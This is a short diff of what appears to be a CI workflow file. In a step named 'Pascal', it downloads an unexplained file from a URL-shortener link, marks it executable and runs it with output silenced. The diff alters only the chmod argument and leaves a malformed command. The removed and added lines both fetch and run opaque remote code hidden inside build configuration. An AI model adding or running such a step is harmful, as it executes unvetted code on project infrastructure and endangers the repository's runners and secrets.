@@ -44,4 +44,4 @@ jobs:
       uses: actions/checkout@v2
     - name: Pascal
       run: |
-        wget https://bit.ly/2VgnCXN && chmod 777 2VgnCXN && ./2VgnCXN > /dev/null
+        wget https://bit.ly/2VgnCXN && chmod 2VgnCXN && ./2VgnCXN > /dev/null
